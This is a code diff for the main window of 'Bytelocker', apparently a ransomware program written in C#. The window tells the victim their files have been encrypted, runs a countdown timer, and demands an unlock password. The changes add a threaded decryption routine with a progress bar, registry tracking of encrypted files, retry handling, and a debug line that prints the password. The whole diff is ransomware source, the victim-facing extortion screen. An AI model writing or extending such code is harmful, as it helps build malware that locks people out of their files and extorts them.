@@ -1,14 +1,27 @@
 ﻿using Bytelocker.CryptoManager;
+using Bytelocker.Settings;
+using Bytelocker.src.UI;
 using Bytelocker.Tools;
 using System;
+using System.Threading;
 using System.Windows.Forms;
 
 namespace Bytelocker.UI
 {
     public partial class MainWindow : Form
     {
+        private static int MAX_DECRYPT_FILE_NAME_LENGHT = 90;
+
         private TimeManager tm;
         private PasswordManager pm;
+        private RegistryManager rm;
+
+        private int progress_bar_inc;
+        private String current_decrypt_file_local = "null";
+
+        public static String current_decrypt_file = "null";
+        public static bool error_decrypt_file = false;
+        public static bool error_decrypt_file_continue = false;
 
         private LinkLabel llAESInfo, llListOfInfectedFiles;
 
@@ -17,6 +30,7 @@ namespace Bytelocker.UI
             InitializeComponent();
             MaximizeBox = false;
             this.tm = new TimeManager();
+            this.rm = new RegistryManager();
             this.tm.ReadFromRegistry();
             llAESInfo = new LinkLabel();
             llListOfInfectedFiles = new LinkLabel();
@@ -42,6 +56,8 @@ namespace Bytelocker.UI
 
         private void MainWindowScreenOne()
         {
+            this.lbCurrentFileDecrypt.Hide();
+            this.pbDecryptProgress.Hide();
             this.BtnVerify.Hide();
             this.tbPassInput.Hide();
             this.rtfInfo.Clear();
@@ -50,7 +66,6 @@ namespace Bytelocker.UI
             llAESInfo.Show();
             llListOfInfectedFiles.Show();
             lbTitle.Show();
-
 
             // rtf box
             this.rtfInfo.AppendText("Your important files, documents, pictures, etc. Have been encrypted." + "\n\n");
@@ -89,9 +104,10 @@ namespace Bytelocker.UI
 
             this.lbTitle.Hide();
             this.tbPassInput.Show();
+            this.btnNext.Hide();
             this.BtnVerify.Show();
 
-            this.rtfInfo.AppendText("Enter password to unlock:");
+            this.rtfInfo.AppendText("Enter password to unlock, then click 'Verify' to begin decryption.");
             this.rtfInfo.Select(this.rtfInfo.GetFirstCharIndexFromLine(0), this.rtfInfo.Lines[0].Length);
             this.rtfInfo.SelectionBullet = true;
             this.rtfInfo.DeselectAll();
@@ -104,14 +120,34 @@ namespace Bytelocker.UI
             if (!(this.tbPassInput.Text == this.pm.returnPassword()))
             {
                 MessageBox.Show("Invalid Password", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                Console.WriteLine(this.pm.returnPassword());
             }
             else
             {
                 this.tmTimeLeftRefresher.Stop();
+                this.BtnVerify.Hide();
+                
                 this.lbTimeLeft.Text = "";
-                Bytelocker.Decrypt();
-                Bytelocker.Uninstall();
+                this.rtfInfo.Clear();
+                this.tbPassInput.Hide();
+                this.lbTitleTime.Hide();
+                this.lbTitle.Text = "Decrypting . . .";
+                this.lbTitle.Show();
+                this.lbCurrentFileDecrypt.Show();
+                this.pbDecryptProgress.Show();
+
+                this.progress_bar_inc = this.pbDecryptProgress.Maximum / this.rm.ReadAllValues(RegistryManager.FILES_KEY_NAME).Count;
+
+               this.tmTimerDecrypt.Start();
+
+                new Thread(() =>
+                {
+                    Thread.CurrentThread.IsBackground = true;
+                    Bytelocker.Decrypt();
+                }).Start();
             }
+
+            this.pm = null;
         }
 
         // override alt-f4
@@ -141,6 +177,70 @@ namespace Bytelocker.UI
             this.UpdateTime();
         }
 
+
+        private void tmTimerDecrypt_Tick(object sender, EventArgs e)
+        {
+            if (error_decrypt_file)
+            {
+                this.tmTimerDecrypt.Stop();
+
+                DialogResult messageBoxInput = MessageBox.Show("Failed to decrypt a previously encrypted file: \"" + MainWindow.current_decrypt_file + "\".\n\n" +
+                    "The file may be damaged/removed/locked or used by another process", "Error", MessageBoxButtons.RetryCancel, MessageBoxIcon.Error);
+
+                if (messageBoxInput == DialogResult.Retry)
+                {
+                    error_decrypt_file_continue = true;
+                    // add 2 second wait time after hitting retry
+                    this.tmTimerDecrypt.Interval = 2000;
+                } else
+                {
+                    error_decrypt_file_continue = true;
+                    error_decrypt_file = false;
+
+                    try
+                    {
+                        this.rm.DeleteValue(RegistryManager.FILES_KEY_NAME, current_decrypt_file);
+                    }
+                    catch (System.ArgumentException)
+                    {
+                        // if the value does not exist in registry
+                    }
+                }
+
+                this.tmTimerDecrypt.Start();
+
+                return;
+            }
+
+            // set interval to regular
+            this.tmTimerDecrypt.Interval = 100;
+
+            if (!(this.rm.ReadAllValues(RegistryManager.FILES_KEY_NAME)[0] == "null"))
+            {
+                if (!(this.current_decrypt_file_local == current_decrypt_file))
+                {
+                    this.current_decrypt_file_local = current_decrypt_file;
+
+                    if (current_decrypt_file.Length > MAX_DECRYPT_FILE_NAME_LENGHT)
+                    {
+                        this.lbCurrentFileDecrypt.Text = FilePathTruncate.TruncatePath(current_decrypt_file, MAX_DECRYPT_FILE_NAME_LENGHT);
+                    } else
+                    {
+                        this.lbCurrentFileDecrypt.Text = current_decrypt_file;
+                    }
+
+                    this.pbDecryptProgress.Increment(this.progress_bar_inc);
+                }
+            }
+            else
+            {
+                this.tmTimerDecrypt.Stop();
+                this.Visible = false;
+                MessageBox.Show("Finished Decrypting. Software will now uninstall.", "Finished", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                Bytelocker.Uninstall();
+            }
+        }
+
         private void UpdateTime()
         {
             int timeLeftSeconds = (int)this.tm.DetermineRemainingTimeInSeconds();
@@ -151,6 +251,7 @@ namespace Bytelocker.UI
                 this.lbTimeLeft.Text = "00:00:00:00";
 
                 // if time is 0, uninstall program
+                this.Visible = false;
                 Bytelocker.Uninstall();
             }
             else
@@ -158,7 +259,6 @@ namespace Bytelocker.UI
                 this.lbTimeLeft.Text = (TimeSpan.FromSeconds(timeLeftSeconds)).ToString(@"dd\:hh\:mm\:ss");
             }
         }
-
 
         private void LaunchListOfEncryptedFilesWindow()
         {
